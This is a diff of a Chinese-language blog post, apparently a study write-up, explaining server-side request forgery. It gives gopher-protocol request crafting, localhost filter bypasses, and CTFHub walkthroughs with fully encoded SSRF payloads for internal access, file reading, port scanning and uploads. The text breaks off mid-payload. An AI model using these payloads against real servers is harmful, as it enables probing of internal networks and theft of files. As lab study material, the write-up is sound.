@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://zlaryy123.github.io/img/avertar.png">
 <meta property="article:published_time" content="2026-02-12T07:06:00.000Z">
-<meta property="article:modified_time" content="2026-02-12T07:06:08.402Z">
+<meta property="article:modified_time" content="2026-02-12T07:49:22.586Z">
 <meta property="article:author" content="ZLARYY">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://zlaryy123.github.io/img/avertar.png"><script type="application/ld+json">{
@@ -17,7 +17,7 @@
   "url": "https://zlaryy123.github.io/2026/02/12/SSRF/",
   "image": "https://zlaryy123.github.io/img/avertar.png",
   "datePublished": "2026-02-12T07:06:00.000Z",
-  "dateModified": "2026-02-12T07:06:08.402Z",
+  "dateModified": "2026-02-12T07:49:22.586Z",
   "author": [
     {
       "@type": "Person",
@@ -158,7 +158,7 @@
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">SSRF</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">SSRF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-12T07:06:00.000Z" title="Created 2026-02-12 15:06:00">2026-02-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-12T07:06:08.402Z" title="Updated 2026-02-12 15:06:08">2026-02-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF:服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">SSRF</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">SSRF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-12T07:06:00.000Z" title="Created 2026-02-12 15:06:00">2026-02-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-12T07:49:22.586Z" title="Updated 2026-02-12 15:49:22">2026-02-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF:服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
 <p><strong>SSRF 漏洞出现的场景</strong> ：</p>
 <ul>
 <li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
@@ -254,7 +254,7 @@
 </ul>
 </li>
 </ol>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\gopher.png" alt="gopher"></p>
+<p><img src="/.io//gopher.png"></p>
 <p>可以看到传输符号类内容必须经过URL编码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意不要忘记后面那个下划线&quot;_&quot;，下划线&quot;_&quot;后面才开始接TCP数据流，如果不加这个&quot;_&quot;，那么服务端收到的消息将不是完整的，该字符可随意写。</span><br><span class="line"> gopher的默认端口是70</span><br><span class="line">如果发起POST请求，回车换行需要使用`%0d%0a`来代替`%0a`，如果多个参数，参数之间的&amp;也需要进行URL编码</span><br></pre></td></tr></table></figure>
 
@@ -263,7 +263,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;,methods = [&#x27;GET&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    user = request.args.get(&#x27;nm&#x27;)</span><br><span class="line">    return &#x27;success,%s&#x27; % user</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000,debug=False)</span><br></pre></td></tr></table></figure>
 
 <p>这样我在抓包的时候就能看到这样一个内容：</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\flask.png" alt="flask"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\flask.png" alt="flask"></p>
 <p>GET型http数据包为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /login?nm=ZLARYY HTTP/1.1</span><br><span class="line">Host: 192.168.1.40:5000</span><br></pre></td></tr></table></figure>
 
@@ -276,14 +276,14 @@
 <p>最后我们试着用gopher协议发送</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.1.40:5000/_%47%45%54%20%2f%6c%6f%67%69%6e%3f%6e%6d%3d%5a%4c%41%52%59%59%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\gopher2.png" alt="gopher2"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\gopher2.png" alt="gopher2"></p>
 <p>可以看到最后成功显示了success,ZLARYY，说明我们的GET请求发送成功</p>
 <p>Gopher协议发送http <strong>POST</strong>请求：</p>
 <p>同样的，简单修改了一下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;,methods = [&#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    user = request.form[&#x27;nm&#x27;]</span><br><span class="line">    return &#x27;success,%s&#x27; % user</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000,debug=False)</span><br></pre></td></tr></table></figure>
 
 <p>抓包之后有如下内容：</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\post.png" alt="post"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\post.png" alt="post"></p>
 <p>在使用gopher协议传递POST请求时，需包含如下内容：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 192.168.1.40:5000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line"></span><br><span class="line">nm=ZLARYY</span><br></pre></td></tr></table></figure>
 
@@ -294,7 +294,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0a</span><br></pre></td></tr></table></figure>
 
 <p>接下来我们试着用gopher协议发送</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\post2.png" alt="post2"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\post2.png" alt="post2"></p>
 <p>成功了，这里提几个注意点：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 192.168.1.40:5000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line">/*Content-Length与POST传参内容之间必须有一行间隔，其次POST、Host、Content-Type和Content-Length缺一不可*/</span><br><span class="line">nm=ZLARYY</span><br></pre></td></tr></table></figure>
 
@@ -303,14 +303,14 @@
 <p>就拿上一个发送POST包来说：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//URL直接编码结果</span><br><span class="line">%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59</span><br><span class="line"></span><br><span class="line">//在末尾直接加上%0d%0a而不对其他内容做任何修改：</span><br><span class="line">%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0a</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\suc.png" alt="suc"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\suc.png" alt="suc"></p>
 <p>成功拿到响应</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//URL编码之后先进行一次将%0a全部替换为%0d%0a的操作</span><br><span class="line">%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%6e%6d%3d%5a%4c%41%52%59%59</span><br><span class="line"></span><br><span class="line">//再在末尾添加上%0d%0a</span><br><span class="line">%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0a</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\suc2.png" alt="suc2"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\suc2.png" alt="suc2"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//URL编码之后直接在末尾加上%0d%0a</span><br><span class="line">%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0a</span><br><span class="line"></span><br><span class="line">//再进行一次替换</span><br><span class="line">%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0d%0a</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\suc3.png" alt="suc3"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\suc3.png" alt="suc3"></p>
 <p>都是可行的</p>
 <h2 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h2><ol>
 <li><p>如果过滤掉了localhost和127.0.0.1，可以采用如下绕过手法：</p>
@@ -357,23 +357,23 @@ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后�
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试访问位于127.0.0.1的flag.php吧</span><br></pre></td></tr></table></figure>
 
 <p>应该是希望我们利用SSRF探测内网</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\1-1.png" alt="1-1"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\1-1.png" alt="1-1"></p>
 <p>成功拿到flag</p>
 <p><strong>伪协议读取文件</strong>：</p>
 <p>本题直接访问与上一题一样，只不过提示变成了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试去读取一下Web目录下的flag.php吧</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\2-1.png" alt="2-1"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\2-1.png" alt="2-1"></p>
 <p>这里我们直接访问行不通，看来是过滤了http，https协议，我们试着用file协议读取</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\2-2.png" alt="2-2"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\2-2.png" alt="2-2"></p>
 <p>这里的Web目录其实就是&#x2F;var&#x2F;www&#x2F;html的意思，可惜这道题貌似不能用php:&#x2F;&#x2F;filter读取</p>
 <p><strong>端口扫描</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</span><br></pre></td></tr></table></figure>
 
 <p>这提示我们去爆破试试</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\3-1.png" alt="3-1"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\3-1.png" alt="3-1"></p>
 <p>Payload Type我们选择Numbers，From 8000 to 9000</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\3-2.png" alt="3-2"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\3-2.png" alt="3-2"></p>
 <p>最后按长度排序就能找到响应与其他不同的端口了</p>
 <p><strong>POST请求</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</span><br></pre></td></tr></table></figure>
@@ -389,7 +389,7 @@ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后�
 
 <p>这段代码没有包含错误处理，也没有设置<code>CURLOPT_RETURNTRANSFER</code>选项，这可能导致cURL的输出直接被输出到浏览器，所以可以利用此curl漏洞进行攻击</p>
 <p>看样子我们需要使用POST提交一串key到内网的&#x2F;flag.php中，那么我们可以采用gopher协议，首先构造POST包：</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\包.png" alt="包"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\包.png" alt="包"></p>
 <p>我们构造一下我们需要的内容：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=49719164264cb75cf9f7de397bdbe95e</span><br></pre></td></tr></table></figure>
 
@@ -414,12 +414,12 @@ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后�
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%36%25%30%64%25%30%61%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%33%64%25%33%34%25%33%39%25%33%37%25%33%31%25%33%39%25%33%31%25%33%36%25%33%34%25%33%32%25%33%36%25%33%34%25%36%33%25%36%32%25%33%37%25%33%35%25%36%33%25%36%36%25%33%39%25%36%36%25%33%37%25%36%34%25%36%35%25%33%33%25%33%39%25%33%37%25%36%32%25%36%34%25%36%32%25%36%35%25%33%39%25%33%35%25%36%35</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\succ.png" alt="succ"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\succ.png" alt="succ"></p>
 <p>果然，这次没有再显示400了</p>
 <p><strong>上传文件</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次需要上传一个文件到flag.php了.祝你好运</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\上传.png" alt="上传"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\上传.png" alt="上传"></p>
 <p>我们试着直接访问<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%EF%BC%8C%E8%AE%A9%E6%88%91%E4%BB%AC%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%8F%AF%E6%98%AF%E6%B2%A1%E6%9C%89%E4%B8%8A%E4%BC%A0%E6%8C%89%E9%92%AE%EF%BC%8C%E5%8F%AA%E5%A5%BD%E6%89%8B%E5%8A%A8%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E4%BA%86%EF%BC%9A">http://127.0.0.1/flag.php，让我们上传文件可是没有上传按钮，只好手动添加一个了：</a></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -427,7 +427,7 @@ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后�
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Just View From 127.0.0.1</span><br></pre></td></tr></table></figure>
 
 <p>我们抓一下上传文件的包：</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\上传2.png" alt="上传2"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\上传2.png" alt="上传2"></p>
 <p>那么我们再次构造一下POST请求：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----geckoformboundary7b8228c49e52730cc0c78876fb212042</span><br><span class="line">Content-Length: 343</span><br><span class="line">/*ZLARYY(我是标记)*/</span><br><span class="line">------geckoformboundary7b8228c49e52730cc0c78876fb212042</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">SSRF Upload</span><br><span class="line">------geckoformboundary7b8228c49e52730cc0c78876fb212042</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交查询</span><br><span class="line">------geckoformboundary7b8228c49e52730cc0c78876fb212042--</span><br></pre></td></tr></table></figure>
 
@@ -435,14 +435,14 @@ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后�
 <p>这里就不废话了，直接给出最后的payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%64%25%37%35%25%36%63%25%37%34%25%36%39%25%37%30%25%36%31%25%37%32%25%37%34%25%32%66%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%64%25%32%64%25%32%64%25%32%64%25%32%64%25%36%37%25%36%35%25%36%33%25%36%62%25%36%66%25%36%36%25%36%66%25%37%32%25%36%64%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%37%25%36%32%25%33%38%25%33%32%25%33%32%25%33%38%25%36%33%25%33%34%25%33%39%25%36%35%25%33%35%25%33%32%25%33%37%25%33%33%25%33%30%25%36%33%25%36%33%25%33%30%25%36%33%25%33%37%25%33%38%25%33%38%25%33%37%25%33%36%25%36%36%25%36%32%25%33%32%25%33%31%25%33%32%25%33%30%25%33%34%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%34%25%33%33%25%30%64%25%30%61%25%30%64%25%30%61%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%36%37%25%36%35%25%36%33%25%36%62%25%36%66%25%36%36%25%36%66%25%37%32%25%36%64%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%37%25%36%32%25%33%38%25%33%32%25%33%32%25%33%38%25%36%33%25%33%34%25%33%39%25%36%35%25%33%35%25%33%32%25%33%37%25%33%33%25%33%30%25%36%33%25%36%33%25%33%30%25%36%33%25%33%37%25%33%38%25%33%38%25%33%37%25%33%36%25%36%36%25%36%32%25%33%32%25%33%31%25%33%32%25%33%30%25%33%34%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%34%25%36%39%25%37%33%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%36%36%25%36%39%25%36%63%25%36%35%25%32%32%25%33%62%25%32%30%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%37%34%25%36%35%25%37%33%25%37%34%25%32%65%25%37%34%25%37%38%25%37%34%25%32%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%37%30%25%36%63%25%36%31%25%36%39%25%36%65%25%30%64%25%30%61%25%30%64%2